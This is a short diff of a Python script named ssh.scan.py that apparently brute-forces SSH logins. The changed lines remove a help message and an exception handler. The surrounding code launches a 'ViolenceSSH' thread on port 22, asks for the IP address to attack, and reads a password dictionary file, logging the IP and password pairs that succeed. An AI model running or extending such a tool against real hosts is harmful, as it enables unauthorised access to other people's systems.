@@ -45,19 +45,10 @@ def main(ip, dic, log):
     threading.Thread(target=ViolenceSSH, args=(ip, 22, 1, dic, log,)).start()
 
 
-def help():
-    print("python ssh.scan.py :\n\
-        修改dict下的ip文件，password按需求修改，然后执行脚本。 \n")
-    exit(1)
-
-
 def begin():
     fpath = os.path.dirname(os.path.abspath('__file__'))
     ip = input("请输入攻击的ip地址")
     dic = sys.argv[2] if len(sys.argv) > 2 else fpath + "\密码库.txt"
     log = sys.argv[3] if len(sys.argv) > 3 else fpath + "\配对成功的ip密码.txt"
-    try:
-        os.system("clear")
-        main(ip, dic, log)
-    except KeyboardInterrupt:
-        exit(1)
+    main(ip, dic, log)
+
